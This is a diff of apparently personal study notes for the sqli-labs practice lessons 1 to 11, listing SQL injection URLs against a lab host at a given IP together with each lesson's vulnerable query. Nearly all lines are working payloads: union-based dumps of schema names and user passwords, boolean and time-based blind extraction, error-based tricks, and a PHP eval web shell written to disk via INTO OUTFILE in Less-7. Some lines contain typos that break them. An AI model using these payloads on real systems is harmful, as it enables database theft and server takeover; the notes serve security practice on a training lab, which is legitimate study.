@@ -3,46 +3,88 @@
 	
 	https://blog.csdn.net/qq_41420747/article/details/81836327
 	
+	sql注入天书
 
 Page-1(Basic Challenges)
 	Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)
 		http://1.117.162.201/sqli/Less-1/?id=1' or 1=1 -- +
+		http://1.117.162.201/sqli/Less-1/?id=-1'union select 1,2,3 from information_schema.schemata--+
+		http://1.117.162.201/sqli/Less-1/?id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+
+		http://1.117.162.201/sqli/Less-1/?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
+		http://1.117.162.201/sqli/Less-1/?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
+		http://1.117.162.201/sqli/Less-1/?id=-1'union select 1,username,password from  users where id=3 --+
+		
 		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
 		
 	Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)
 		http://1.117.162.201/sqli/Less-2/?id=1 or 1=1 -- +
+		http://1.117.162.201/sqli/Less-2/?id=-1 union select 1,username,password from  users where id=3 --+
+		
 		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
 		
 	Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)
 		http://1.117.162.201/sqli/Less-3/?id=1') or 1=1 -- +
+		http://1.117.162.201/sqli/Less-3/?id=-1') union select 1,username,password from  users where id=3 --+
+		
 		$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
 		
 	Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）
-		http://1.117.162.201/sqli/Less-4/?id=1) or 1=1 -- +
-		$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
+		http://1.117.162.201/sqli/Less-4/?id=1") or 1=1 -- +
+		http://1.117.162.201/sqli/Less-4/?id=-1") union select 1,username,password from  users where id=2 --+
+		
+		$sql="SELECT * FROM users WHERE id=("$id") LIMIT 0,1";
 		
 	Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)
+		http://1.117.162.201/sqli/Less-5/?id=1' and left(version(),1)=5 -- +
+		http://1.117.162.201/sqli/Less-5/?id=1' and left(version(),3)=5.7 -- +
+		http://1.117.162.201/sqli/Less-5/?id=1'and length(database())=8 -- +
+		http://1.117.162.201/sqli/Less-5/?id=1'and left(database(),1)>'a'--+
+		http://1.117.162.201/sqli/Less-5/?id=1'and left(database(),3)='sec'--+
 		http://1.117.162.201/sqli/Less-5/?id=1' and if(length(database())=8,sleep(5),1)--+
+		http://1.117.162.201/sqli/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit  0,1),1,1))>80--+
+		http://1.117.162.201/sqli/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit  0,1),2,1))>80--+
+		http://1.117.162.201/sqli/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit  1,1),1,1))>113 --+
+		http://1.117.162.201/sqli/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+
+		http://1.117.162.201/sqli/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^user[a-z]' limit 0,1)--+
+		http://1.117.162.201/sqli/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^users' limit 0,1)--+
+		http://1.117.162.201/sqli/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))= 68--+
+		http://1.117.162.201/sqli/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+
+		http://1.117.162.201/sqli/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+
+		http://1.117.162.201/sqli/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2, 3--+
+		http://1.117.162.201/sqli/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3 --+
+		http://1.117.162.201/sqli/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+
+		http://1.117.162.201/sqli/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+
+		http://1.117.162.201/sqli/Less-5/?id=1'union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x --+
+		
 		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
 		
 	Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)
 		http://1.117.162.201/sqli/Less-5/?id=1" and if(length(database())=8,sleep(5),1)--+
-		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+		http://1.117.162.201/sqli/Less-6/?id=1" and left(version(),1)=5 -- +
+		
+		$id = '"'.$id.'"';$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
 		
 	Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）
 		http://1.117.162.201/sqli/Less-7/?id=1')) union select 1,2,'<?php @eval($_post["xiao”])?>' into outfile "d:\\xiao\\1.php" -- +
+		
 		$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
 		
 	Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)
 		http://1.117.162.201/sqli/Less-8/?id=1' or 1=1 -- +
+		
 		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; //print_r(mysql_error());
 		
 	Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)
 		http://1.117.162.201/sqli/Less-8/?id=1' or 1=1 -- +
+		http://1.117.162.201/sqli/Less-9/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
+		http://1.117.162.201/sqli/Less-9/?id=1'and If(ascii(substr(database(),2,1))=101,1,sleep(5))--+
+		http://1.117.162.201/sqli/Less-9/?id=1'and If(ascii(substr((select table_name from information_s chema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+
+		http://1.117.162.201/sqli/Less-9/?id=1'and If(ascii(substr((select table_name from information_s chema.tables where table_schema='security' limit 1,1),1,1))=104,1,sleep(5))--+
 		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; //print_r(mysql_error());
 		
 	Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)
 		http://1.117.162.201/sqli/Less-10/?id=1" or 1=1 -- +
+		
 		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
 		
 	Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)
